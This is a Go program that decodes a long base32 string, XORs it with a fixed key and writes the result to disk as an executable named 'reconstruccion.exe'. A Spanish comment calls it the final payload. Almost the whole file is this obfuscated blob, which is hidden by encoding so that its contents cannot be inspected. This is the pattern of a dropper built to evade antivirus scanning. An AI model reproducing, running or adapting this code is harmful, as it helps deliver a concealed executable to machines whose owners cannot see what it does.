package main

import (
	"encoding/base32"
	"fmt"
	"io/ioutil"
)

func Xored(buffer []byte, xorkey byte) []byte {
	resultado := make([]byte, len(buffer))
	for i := 0; i < len(buffer); i++ {
		resultado[i] = xorkey ^ buffer[i]
	}

	return resultado

}
func base32decode(codigo string) string {
	pay, _ := base32.StdEncoding.DecodeString(codigo)

	return string(pay)

}
func main() {
	content := "BMONMRSFIZDEMQSGIZDLTOKGI37EMRSGIZDEMRQGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGYZDEMRSILH6EQRXSJ6FWP7SHBKFWOEROF42WMNRUFEQTIJZLMYSSOKBIFEZGMJBDMY2DGKDGF4UGMAQJCVTCWKJCENUEWS2MMJDEMRSGIZDEMFQDIZDCFQCEIZZHCPOBIZDEMRSGIZDENNSGMRDE2RDWIZDEQRSGIZAEMRSGIZDEMRSGIZDEMZSGIZDEMRQGI5DEMRSGMZDEMRSEIZDEERSGIZDEMRSGIBDEMRSGIZDEMRRGIZDEMRCGIZDEMRSGIRDCNQ2GIYDEMRSGIZDEMBSGIZDEMRSGIZDFMRSGIZDEMRTGIZDEMRSGIZDEMRSGKZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIYDEMRW2INDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDKU2SGIZ7EMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDGMRSGBZDEMRSGIZDEMRSGIZDGQMRDHYZEMRSGYRFUMRSGMZDEMRSIIZDEMRCGIZDEMRSGIZDEMRSGIZDEMZSGIYTGQNBVGQSUMRSG3JBUMRSGAZDEMRSAIZDEMVSGIZDEMRSGIZDEMRSGIZDEMBSGIYDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDA4RSGIZCEMQ2GIZTUMRTSJVDEMR2GIZDEORSGIBZGURSG7ZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRTQIY2EORSGGZXFERSGJRQGYYCENZJUMRSMIZDGYVLWIRDH6RSGIZDUMRSXIY4EORSGIJJLQR2MIBVGIRRUBVDEMNUWIVDEMRDOKBDEMTBJKFDEMTBVLZDEMTCNIHDEORSGIJDDQR2GIZBEU3KGJZWEMRSGKV3EORSNIZDEMRCGIZLUMOCEIZDEETDNIZAGYZCGITDEIRSGIJWFK5SHIZGUMRSGIVDEMV2GHBCUMRSCJRWUMQDMMRCG4X2GIZGEM3AQGVAUMRSANZOEMRSMGJBEMRSEYZCUMRSCNRDEMBAVBQCEORSHIZDEMRSGJJDEMRRQOJUHM2DVOZ2XO72GIZDEMQ2GFJDEMRWWIVDEMZJYIZDLURKGI3DEERSGMUKTENBPFAQTKRSGIZDDUTSGI3HEMRSGMUJRKRSCJ5DEMVSGIZDGKAITB4BEMRSGKJHUMRTGIRDEMZIEFIUSIRSGIZDEMRSGIRDEMRYRKPSEOT2HIZDENPCHOVDFARSGI5DEMRSZIZDEMQSGIZDEKRSGIZHEMRSGI5DEMRS4IZDEMUCGIZDEKRSGIZCEMRSGIVDEMRSCIZDEMR2GIZDEKRSGIZDUMRSGIZDNURCHIZDEMRSGIBDE2RHNIVAEMPSE5VCUARTAI47UKSKGIVBEMRSAIYQUOZCFIBDKQR3EIVAENCKHMRCUARQZIRSEKQCGNVCGIRKAIYBEIZCFIBDDQR3EIVAEMFKHZJCUARVCI3FEKQCG6RDWIRKAI3PUP3SEIBDAKQVGIRAEN4CGUZCEYRVUIYJEKQCGJ5DT6RKAI2HUN3KFIBDAERMNIVAEM4SFJNCUYRXHI2CEITCGPRDYIRCMI3HUNPSEJBDC4QTIIJEEMECCNBBEARQ2I2TEIQCGPZDKMRCAIYYUEZCFJRDNERV6IRDEMRSGI5DEMRSGIZDUMR2GYZDVMRU6IRKUMB2GI5DEORSGIZLENFCFKRBAORSHIZCEMRSHKZDGGQSUIIRUMRKGIBDFORVBIQTUMV2GH5DCGRSXIZXEML2GBZTEMRSGI3LUNNKEFNDEORQQMZDEMRSGYVPCURKAIZDUMJTGIZDEMRWVJYDEKN2GI5DO4ZSGIZDENVKOE5DDARSHI34WMRSGIZDNKTRLIY6UMR2GRZTEMRSGI3IE4DCCY5DEIRUZMZDEMRSGYBPCURKAIZCENLTGIZDEMRWXLY2EKK2GIRDEMRSHI3IEIT2GFJCUORSXIYVEKQCGL5DCURKMIZXUMKSFKZDHORRKIVLEM72GFJCVMRQHIYVEKVSGB5DCURKWIYLUMKSFKZDB6RRKIVLEMJ2GFJCVGRRPIYVEKVSGG5DCURKWIY7UMKSFKZDM6RRKIVAENV2GFJCVYRW7IYVEKQCG45DCURKAI2DUMKSFMZDJORRFIJQENR2GFJCUARVHIYGEM4SGU5DDKQT5I3XUMKSFAZDI6RRKIVAENP2GLVDBORTGIY6UMMCHN5DN2RSQIRUEMTKG2NDGQRSVI3MEM2CGLVDPWRTIIZSUNACGNBDG2RUVIZUEM5KGSVDGQRT5I2KUM2CGAVDIARTIIYGUNH2GNBDBKRUVIZUEMHKGSVDGQRRFI23UM2CGFVDF2R3IIY2UM3SHB5DN2RSQIQSUNRKGHVDSKRWNIYYEOJKG2VDDAR6FI3KUMMCHYVDMKRX2I5VEMAKGBJDEKRSHIZBEMRKGIZDAEROAIZDENR2GZVDEMRQIILLEMRCGIVDEKRSEIZBEMQ2GI5DEGRSDIZCEMQCGIFDEFRSGIZDUMRSGIZDEMRSGIZDEMRSGKVDEMRSCIZDEMRSGIZDEMRSGIYPEMTCGIZDEMRSCIZDEMRSGIZDEMRSGIYPENJSEIZDEMRSCIZDEMRSGIZDEMRSGIYPEM2CCIZDEMRSGIZDEMR2GIZDJURKGIZDEMRT2BMUSEMZKEN4EMKZVEUUTIKRPERDDMJZ7FIUSOISGCU7SQJJOGQUSQLZ4EMREMIRDEATTGKRSB4UDKMRHFASSGRQUGMUDELZLEMJD6NRDBYTSQIRKENDACIZSCI7TMIYAGQUSWDRHFARCUI2GCI7TMI2GEERTEGIFGMVDEMZUENDDKIZSDECTGKRSGM2CGRRUEM2SSMZUEURQKMZKGIZTII2GA43DMKRPEUTTELZJFAKSGMRSF4UCCNIEE42SGRQDEIXTEKJUAQ2CSMJVE4SCUIYVGITTEI2GCUJAOEROGQRSOIQHGIZDILZEGMZCGRQFFEVTMLZKEM2ACIZIEM2COMRDEIDTEMRUF4SDGMRDIYATGLZCA4ZDENBPEQZTEI2GAERSQIZUE4ZCGIQFFERCGBZSGI2C6JBTGIRUMARDEQZSCIJDGQECSKATGURTIBJJEIRQOMRSGQXSIMZSENDAEIZEGMQSCJZEFIRQOMRSGQXSIMZSENDAGIRPGIUTIBBUFEYTKJZEFIRQOMRSGQXSIMZSENDAKKJLCAXTKLZEFIRQOMRSGQXSIMZSENDAONJVEMVSIKR7CIXTEKRDA4ZDENBPEQZTEI2GA42TKIZLEQVD6ERUE4RCGKZHGQWQOMRSGQXSIMZSENDBEJZUEERTEABUE4VSGMJJGQWQOMRSGQXSIMZSENDAONJVEMVSIKR7AAXSUIYQEM2DKLZJFADTEMRUF4SDGMRDIYDTKNJDFMSCUPYFFEUCALZBGM2COMRPFEUAOMRSGQXSIMZSENDAONJVEMVSIKR7AIRTKJJUF43DELZJFADTEMRUF4SDGMRDIYCSSKZWF4VCOMRPFEUBIIZKE47COMRPFEUDKBZSGI2C6JBTGIRUMBZVGURSWJBKH4LDIKJCGMSTEBZSGI2C6JBTGIRUMBZVGURSWJBKH4CSSNR7GQXSCLRSA4ZDENBPEQZTEI2GA42TKIZLEQVD6BJJFM3COKB7A4ZDENBPEQZTEI2GCQZSQMRPFMRQKKJLGYTTELZEF4VC6MR7A4ZDENBPEQZTEI2GGATSUMZDIY3COPZKFETSE2BDHYRUMFJ7GUZCGK3ICQZSQMRPFMRWQEBDGQ2S6KJIF4UCCRQVH42TEIZLNACSSKZWFEUCGKBSBMUSEIZKIYLDIKJBGQTSWRQVH42TEIZLIY2CGNJJGM2CKIYLE4UEMCZHF4UEMFJ7GUZCGK3IAUUSQIBPEEZTIJZSF4USQRQVH42TEIZLNAASUKJEE4VC6PBHGIXSSKCGCU7TKMRDFNUBIIZAFIRSKMRPFEUEMBJTFIZDGNBDB4UCAKKGEERTEGIUEM2SSMZUEURQWJZIE4QSGNCGCU7TKMRDFNUAKKJCEMBCSK3IAUUSWNRPFIRTIRTIEUZCSNCGNASSKMRJGRDBKPZVGIRSW2ACF4TSCKBJGUZC6JJVIYKT6NJSEMVWQFBTFAZC6KZDNAHSQMRDGQUTMFJDGQYC6JJDGVDBKPZVGIRSW2AUGMUDELZLENUAKKJLGYXSUIZUCURTIMBPEURTKRQVH42TEIZLNAKCGNJJGM2CKIZVIY3COPZKFETSE2AWGQUTMIZUGIXSGNLICQRTKKJTGQSSGNLIGQRTKKJTGQSSGNKGAIRSIMZBEEXSQIILFERCGNKGGYTT6KRJE4RGQFRUFE3CGNBSF4RTKRQVEMZDELZIEE2UMFJ7GUZCGK3ICEXSQIRJGE2WQABJGQVTKRQJEQWCGJJSIYQSGMQZAIRSAJZTFIZEMARPE4VCSIIUEM2TGKRSIYKS4KJRIYFSGNJVE4QSGBBJHZDCCIZSDEDTKNJDFMSCUP2GIYHQKRRJIYUEMIKGGRDCORRSIYZUMKSGE5DDERRPIYUUMKCGGVDGMRRDIYWEMI2GGRDCKRRPIYSUML2GFFDGKRTXIZTEMNKGGNDDMRRDIY2EMJ2GEJDCSRSGP43EMJ2GH5DCURRJIYTUMISGNBDBMRRUIYUUMNSGENDDIRRSIYXUMI2GGVDGQRQUIYRUMNKGFFDDGRRUIYSUMI2GGVDEMRSGI2ZPSQZEPGOFSDP47PYX2MPF3RKEMQTGI5DU4RLGIZDUGZSHI5LVOQTGI5DUQQTGI5DUIQ3GIRDUQSCDMZDUOVY3INDEOVZLJBAUCRKEKQJVIE2AIZDVIN2XGNBGMRSUH5AGMRCHJBKD6QSBI5KB6QSBI5KFMQCGI5KDWVB3J3YTYGQQL5ZKNT2FIBKBGRKAKQPUKQCUKZCUMRSHIJDEMVATIJDEMVA7INDEOR2UD5BEMRSUKZBE4RSUCNBE4RSUD5BE4RSUKZHEORSOIZDEMRSGLBDUMR2GCJCFAEJUE43AQKJIAM7CKIZWGIXSSKASFY2CSMJVI5HEORSBI5DEMRSGJJDUMQJWE47SUKJHEJDEMQ2HIZDEMRSRI5DFIBJJGY7TILZBFYZGNBHPMZTHI5TUORDEM32HIZRHG7TXEATXE5LTNMSCEJLUNNZH6IT6NN7HC4JFNMQHEJBEOJ7CGJ36OVZXCRSGJJDUMQLXNB3GQ5TIOZDEMC2HIZNGQCADCIADIJZLEMYSSNBNNIICGNBVF4USQ6ZQOJUHC2DUI5DBESCSAA2COKZDGEUTILICF42TMKRHH4ECOKZDKJUAQAYSMYADIJZLEMYSSNBNMZZGQ4LIORBEORSGIYDEORTVCU7TKMRDFNUBIIZVFEZTIJJDGVUBEKJJFI2WQFJSGQUSQIJKH4JD6NRDEIKCGNJJGM2CKIYEGMXSUIRDGRAXE2DWNB3GQ5SGIYPUORQNBMXSKNBJGUUSAMTICAXTKMZHFIKTEMZCF4UWQAZCF4ZCSNBVNAKSGMRSF4UCCNICEM2S6IJIEM2GQFJDGIZC6KBBGUKS6KBBFIRQALZKEMASGKBDGQTTEKJUJZ3XO2DWNB3GQ5SGIZHEORSEIZDEMRSGI3ZEMRSGRCGKT6CHIZDENV2GIZDCUFJ7GUZCGK3ICQRTKKJTGQSSGNLICQRTKKJTGQSSGFBDE4RCGNDKMYVTKJJJGQVC6JDKMYICGNBVF4USQ63SNB3GQ5TIOZVGMBJTFIZDGNBDPMUCGMZSGQTSU2TGCYZSIKRPEUGSGPYSFEWSGKD3ERYXCJ3TEVZXA537OVZCG5T6P5SRKPZVGIRSW2AUEM2SSMZUEURTK2AUGMUDELZLEMKCGNJJGM2CKIYVEMZEIRSGIZDEMRSGIZDEMRQWA4BBMBYCC3ZEMRSGIZDEMRSBPXUY2RSGIZDEIRSGIYMEMRSGMJVUMRTCJFDEMRSGIZDEMRSGIZDEMRSGKZDEMRSGIZDEMRSGIZDEMRSGIYKBKAQVMNJJO3KCF7DQD3DWO6MCKULE7ZDUMRSGAV6BUEZVEM2DKGRCOI2C2JI2GUUTGNBFEMNDIIZWFE2RUNRHH4VCSJZCDI3COPZKFETSEGRJEQWBUPTQOINAEIZEGMQRUNRHH4VCSJZCNA3CEJCGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIRDFMRSGIZTEMRWGLZDEMRQWIZDMMRSGIZDEMRSGIZDEMRSGIZDEORSHIZDEM7SGI3DEMRSGIZDEMRSGIZDEMRSGIZDUMRSGIZDMMRSGIZDEMRSGIZDEMRSGIZDEMRSGI5DEORSGIYXEMRWGIZDEMRSGIZDEMRSGIZDEMRSHIZDEMRSG3JCUMRWWAZDEMSSFIZDEMRSGIZDEMRSGJJCXERSGIYIEMFKGDFDBARQDIYKEMFKGB5DASRQIIYMUMD2GBBDAARQJIZDEMRSG7NBKTOCGIZDUMRSGI5DEMRSGIZDEMR2GIZDEMRTZIZDEMRSGIZDEERSGIZDUMRSGIZDEMRSGIZDEMRSGIZDAERSGIZDUMECGE5DDIRQAIYXUMKSGENDA6RRIIYQEMKKGIZDEMRTCIZBEMRSGCJDDIRRHIYUEMNKGFJDCORRSIYXUMKKGFBDEMRSGIZDEN5SCFJCEMRSHIYKUMMSGGRDC6RRIIYQUMACGF5DCURRDIYHUMKCGEBDCSRSGIYHEIRSGI5DHMRTWIZ3EM5SGOZDHERREIZ3EMRSGLRDEORSHIYCUMKKGFNDCWRRDIYUEMMSGGVDEMRSGIZDEMZCGI5DEORQFIYUUMK2GGZDCORRIIY7UMCCGE5DCWRRDIZDEMRSGIZDEMRT6IZHEMR2GABDC6RRKIYRUMASGENDDKRRFIY2EML2GGZDDERRPIYUUMKCGIZDEMRRWIYTUMP2GFJDCSRRHIYREMRSGOZDE4RSHIYAEML2GFJDCGRQQIYRUMNCGGVDC6RRJIYUEMRSGIZDHORTIIZ3EM2CGOZDGQRTWIZDEM7SGJJDEORQPIYUEMMSGENDDIRRIIYTUMKSGBBDCORRLIYRUMRSGGZDCORR7IYVEMKKGE5DCERTIIYRUMPSGENDEMRQOIZKEMR2GBJDCGRRBIYTUMKSGAVDCSRRWIY7UMNCGF5DCCRROIYZEMRSGAVDCSRRWIY7UMNCGF5DCCRROIYZEMZSG55DGMRTGIZ2EM5SGORDHIRSGIZWEMR2GI5DAURRDIYQUMJ2GFJDBERRUIYTUMISGENDCWRRHIY2EMLKGGVDEMRSGIZDEMRSGAZDEURSHIYEUMNCGF5DCCRRPIYUEMJ2GFJDAARRPIYVEMI2GFBDCORRLIYRUMRSGGZDCORR7IYVEMKKGE5DCERTIIYRUMPSGENDEMRTWIZHEMR2GCZDDIRRJIYREMM2GEVDDERQIIYTUMK2GENDEMRSGIY3EMJ2GH5DCURRJIYTUMISGIZDHERSOIZDUMFSGGRDCSRRCIYZUMJKGGJDBARRDIY2EMNKGF5DCSRRIIZDEM52GNBDHMRTIIZ3EM2CGOZDEMRT6IZHEMR2GA5DDKRRVIYRUMK2GERDCURR7IZTEMECGENDDIRRVIYXUMKKGFBDEMRTXIZUEM5SGNBDHMRTIIZ3EMRSG5ICUMRVMI5DEMRSGIZDEMRSGI2U736L2PE7CWKTGGARTINJPFEUHWZDXNB3GIZRDFASSSIRPFAQXWZATCIAGW7TEMY2TEJZIEITSUKJIEN5WIPZDGVSHS6CLJRFUY6RHGU2SGKZEFI7WMPRLFIUDK63EGM2CQ7BVEUXCGKZHGVVSWLZFGQUTKKJAGJVSKKJLPQTTKK3IGB3WIZRLE4UC6IBDGUZBAIZUGUXSSKD3MR3WQ5TEPBFUYZTGPITTKNJDFMSCUPYPEIRSQMRPGI7WMMBDGQ2S6KJIPNSHO2DWNB3GQ5TEMYUCOKZDPNSAWPYHGY3CULZFE4ZC6KJINATTMNTENF4EWTDGMZ5DENBTGUZA6KBAFFTD4KZKFA2XWZBTGQUHYNJFFYRSWJZVNMVS6JJUFE2SSIBSNMSSSK34E42SW2BQORSHQS2MMZTGMZT2GURSKMZUF4ZD66CLJRTGMZTGMZTHUNBDG4ZSGNJSEMRBMNBPGAXSUIZBEM2WMPRLFIUDK63EGM2CQ7BVEUXCGKZHGVVSWLZFGQUTKKJAGJVSKKJLPQTTKK3IGB2WI6CLJRTGMZTGMZTGMZT2GQRTOMZDGUZCGIQDHYRSKMZSF4USQCRDGARSUZRKEMYCGKT3MQTTKDZIGAUS2IZUMRTDGLYHEUSSGNJVPNSCAJZKGURWI2LYJNGGMZTGMZTGM6TJGQRTOMZDGUZCGIQWGQXTALZKEMQSGNLYJNGGMZTGMZ5GSNJDEUZTILZSH54EWTDGMZ5GSMRUGM2TEDZIEAUXQS2MPJUSONJVEMVSIKR7PBDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDEMRSGIZDA===="
	codificado := base32decode(content)
	//fmt.Println(codificado)
	data := Xored([]byte(codificado), 70)
	fmt.Println(data)
	//data2 := strings.Replace(string(data), "", "", -1)

	// generando el binario o el payload final
	ioutil.WriteFile("reconstruccion.exe", data, 0644)
}
